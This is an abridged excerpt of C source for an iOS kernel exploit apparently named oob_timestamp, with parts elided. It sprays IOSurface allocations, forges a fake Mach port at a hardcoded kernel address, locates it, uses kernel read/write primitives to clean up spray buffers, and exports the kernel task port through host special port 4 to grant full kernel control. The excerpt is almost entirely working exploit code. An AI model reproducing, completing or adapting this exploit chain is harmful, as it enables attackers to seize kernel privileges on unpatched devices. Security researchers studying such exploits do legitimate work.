...
uint64_t ADDRESS(fake_port_page) = 0xffffffe18b2e0000;
...
oob_timestamp() {
	...
	bool ok = oob_timestamp_parameters_init();
	if (!ok) {
		fail();
	}
	...
	// Wire down the command buffer and segment list. This does not ensure that accessing these
	// pages from the kernel won't fault.
...
#define FREE_ME	0x2121656d65657266
	ok = IOSurface_kmem_alloc_array_fast_prepare_(
		...
		*(uint64_t *)((uint8_t *) data + 8 * page_size) = fake_port_address;
		// The first word and last word of the allocation is a key indicating that this
		// allocation can be freed during IOSurface spray cleanup.
		*(uint64_t *)((uint8_t *) data) = FREE_ME;
		*(uint64_t *)((uint8_t *) data + 16 * PAGE_SIZE - sizeof(uint64_t)) = FREE_ME;
	});
	if (!ok) {
...
retry_overflow:
	...
	void (^init_fake_port)(void *) = ^(void *page) {
		...
		strcpy((char *) page_data, "****** MACH PORT ******");
	...
	for_each_page(command_buffer, command_buffer_size,
		...
		if (ip_receiver != 0) {
			...
			*stop = true;
			INFO("Found fake port in command buffer at offset 0x%08zx",
					port - (uint8_t *) command_buffer);
		}
	});
	...
	strcpy((char *) fake_task_page, "~hacking like it's 2019");
	...
	strcpy((char *) page_buffer, "~hacking like it's 2019");
	...
	memset(page_buffer, 0, sizeof(page_buffer));
	strcpy((char *) page_buffer, "****** MACH PORT ******");
	...
	for (uint32_t property_idx = 0; property_idx < property_count; property_idx++) {
		...
		for (uint32_t element_idx = 0; element_idx < element_count; element_idx++) {
			...
			// have its size set to zero, unless we can prove that it is a partially
			// freed spray buffer that we own and can safely clean up.
			...
			uint64_t buffer_start = kernel_read64(osdata + OFFSET(OSData, data));
			...
			for (size_t i = 0; i < validated_buffers_count; i++) {
				if (buffer_start == validated_buffers[i]) {
					goto disable_free;
				}
			}
			// Get the start address and size of the allocation that contains the first
			// page of the OSData buffer.
			mach_vm_address_t region_start = buffer_start;
			mach_vm_size_t region_size = 0;
			natural_t depth = 0;
			struct vm_region_submap_info_64 info;
			mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
			kr = mach_vm_region_recurse(kernel_task_port,
					&region_start, &region_size, &depth,
					(vm_region_recurse_info_t) &info, &count);
			if (kr != KERN_SUCCESS) {
				WARNING("Could not determine OSData allocation region");
				goto disable_free;
			}
			// If this OSData's buffer exactly aligns with the allocation, we can be
			// sure that we own it.
			if (region_start == buffer_start && region_size == buffer_size) {
free_this_buffer:
				assert(validated_buffers_count < validated_buffers_capacity);
				validated_buffers[validated_buffers_count] = region_start;
				validated_buffers_count++;
				continue;
			}
			// We need to check if this is one of the two partially freed buffers.
			// Check for the FREE_ME constant that suggests this is our allocation.
			uint64_t region_end = region_start + region_size;
			uint64_t buffer_end = buffer_start + buffer_size;
			uint64_t check_word = 0;
			if (region_start == buffer_start && region_end < buffer_end) {
				// Possibly the OOL ports reallocation; we expect the size to be 8
				// pages.
				check_word = kernel_read64(region_start);
			}
			if (region_end == buffer_end && buffer_start < region_start) {
				// Possibly a partially freed kfree buffer allocation. Could be any
				// size less than 16 pages.
				check_word = kernel_read64(region_end - sizeof(uint64_t));
			}
			if (check_word == FREE_ME) {
				// Looks like we found a valid buffer! Let's adjust it and then
				// free it.
				kernel_write64(osdata + OFFSET(OSData, data), region_start);
				kernel_write32(osdata + OFFSET(OSData, capacity),
						(uint32_t) region_size);
				goto free_this_buffer;
			}
			WARNING("Leaking 0x%016llx-0x%016llx; %llu pages; "
					"allocated as 0x%016llx-0x%016llx",
					region_start, region_end, region_size / page_size,
...
disable_free:
	...
	// 40. Export the kernel task port via host special port 4. Also set all_image_info_addr to
	// a kernel_all_image_info_addr struct and all_image_info_size to the kASLR slide.
	struct kernel_all_image_info_addr kernel_info = {};
	kernel_info.kernel_all_image_info_addr_magic = KERNEL_ALL_IMAGE_INFO_ADDR_MAGIC;
	kernel_info.kernel_all_image_info_addr_size = sizeof(kernel_info);
	kernel_info.kernel_base_address = kernel_base;
	kernel_info.kernproc = kernproc;
	uint64_t kernel_all_image_info_addr_struct = kernel_vm_allocate(page_size);
	kernel_write(kernel_all_image_info_addr_struct, &kernel_info, sizeof(kernel_info));
	// Set the all_image_info_addr and all_image_info_size fields.
	kernel_parameters_init();
	uint64_t kernel_slide = kernel_base - STATIC_ADDRESS(kernel_base);
	kernel_write64(fake_kernel_task_address + OFFSET(task, all_image_info_addr),
			kernel_all_image_info_addr_struct);
	kernel_write64(fake_kernel_task_address + OFFSET(task, all_image_info_size), kernel_slide);
	// Convert the host port into a host-priv port.
